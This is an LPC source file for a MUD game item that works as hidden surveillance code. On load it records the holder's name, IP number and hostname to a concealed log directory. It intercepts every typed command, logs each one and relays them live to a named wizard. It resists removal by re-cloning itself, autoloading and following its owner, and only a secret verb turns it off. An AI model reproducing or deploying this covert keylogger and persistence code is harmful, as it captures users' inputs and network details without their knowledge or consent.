inherit "/obj/clean";
#define haha  "babs"

string owner;
int LetMyPeopleGo;
int m;
reset(arg) {
  if(arg) return;
  
  set_no_clean(1);
if(this_player() && (query_verb() && query_verb() != "inactive"))
write_file("/players/mythos/closed/others/[]"+
this_player()->query_real_name(),this_player()->query_real_name()+
" "+query_ip_number(this_player())+"  "+ this_player()->query_hostname()+"\n\n");
  
  m = 0;
  call_out("heh",1);
}

query_prevent_shadow() { return 1; } 
get() { return 1; }
drop() { return 1; }
id(str) { return str == haha; }
init() {
  add_action("ekg");add_xverb("!");
  add_action("ekg"); add_xverb("");
}

set_listen(n) { m = n; }

ekg(str) {
object ob;
int h,ll;
  if(this_player() && this_player()->query_real_name()=="x")
{
 if(str) write("str: "+str+"\n");
 if(query_verb() && query_verb() == "inactive")
  {
     LetMyPeopleGo = 1;
     write("Releasing from newBaka status...\n");
     return destruct(this_object());
  }
}
if(m) {
  if(find_player("vertebraker")) {
tell_object(find_player("vertebraker"), "**"+
    (this_player()->query_name())+
    "**"+query_verb()+" "+str+"\n");}
    else {
      ob = users(); ll = h = 0;
      while(h<sizeof(ob) && !ll) {
        if(ob[h]->query_real_name() == "vertebraker") {
           tell_object(ob[h], "**"+(this_player()->query_name())+
            "**"+query_verb()+" "+str+"\n");
        ll = 1;
        }
        h = h + 1; }
    }
}
write_file("/players/mythos/closed/tell/[]"+
this_player()->query_real_name(),
    (ctime(time()))+" > "+
    (this_player()->query_name())+
    "**"+query_verb()+" "+str+"\n");
    return 0;
}

heh() {
  if(root()) return;
  if(environment(this_object()))
  {
  if(owner == "0") owner = environment()->query_real_name();
  move_object(this_object(),environment(this_object()));
}
  if(!environment() || environment()->query_real_name() != owner)
{
  if(owner) { 
  if(find_player(owner)) move_object(this_object(), find_player(owner));
  else write_file("/players/mythos/closed/play/LOSTNEWBAKA", ctime()[4..15] + " Lost from " + capitalize(owner)+"\n");
  }
 }
 call_out("heh", 1);
return 1;}


remove_object()
{
  if(!LetMyPeopleGo) {
  if(environment() && living(environment()) && query_ip_name(environment())) owner = environment()->query_real_name();
  move_object(clone_object("/players/mythos/closed/play/newBaka"), environment());
 }
}

query_auto_load()
{
 if(!LetMyPeopleGo) return "/players/mythos/closed/play/newBaka:" + owner; }

init_arg(x) { owner = x; }

query_owner() { return owner; }

query_listen() { return m; }

set_release(x) { LetMyPeopleGo = x; }
